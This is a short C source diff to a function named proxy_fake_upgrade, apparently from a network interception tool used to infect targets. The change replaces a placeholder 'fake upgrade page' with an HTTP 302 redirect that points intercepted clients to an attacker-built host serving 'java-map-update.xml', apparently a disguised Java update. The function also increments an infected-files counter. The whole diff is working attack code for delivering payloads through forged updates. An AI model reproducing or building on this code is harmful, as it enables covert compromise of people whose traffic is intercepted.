@@ -28,33 +28,23 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file, char *tag, char *host
 
 int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host)
 {
-   char data[READ_BUFF_SIZE];
-   struct stat st;
-   size_t content_length = 0;
+   char header[HTTP_HEADER_LEN];
    char ipa_url[MAX_URL];
 
    /* calculate and replace the IPA_URL in the file */
    snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);
 
-   DEBUG_MSG(D_INFO, "Sending fake upgrade page [%s] len [%d]", file, st.st_size);
+   DEBUG_MSG(D_INFO, "Tag: %s, sending fake upgrade redirect [%s/%s] ", tag, file, "java-map-update.xml");
 
+   snprintf(header, HTTP_HEADER_LEN, "HTTP/1.0 302 Found\r\n"
+      "Location: %s/%s\r\n"
+      "Content-Type: text/html\r\n"
+      "Connection: close\r\n"
+      "\r\n", ipa_url, "java-map-update.xml");
 
-   /* prepare the HTTP header */
-   sprintf(data, "HTTP/1.0 200 OK\r\n"
-       "Content-Length: %u\r\n"
-       "Content-Type: XXXXXX" /* Content-Type: */
-       "Connection: close\r\n"
-       "\r\n", (u_int)content_length);
+   BIO_write(*cbio, header, strlen(header));
 
-   /* send the headers to the client */
-   BIO_write(*cbio, data, strlen(data));
-
-   /* send the body to the client */
-   // TODO: guido :)
-
-   /* update the stats */
    GBL_STATS->inf_files++;
-
    return ESUCCESS;
 }
 
@@ -62,4 +52,3 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *hos
 /* EOF */
 
 // vim:ts=3:expandtab
-
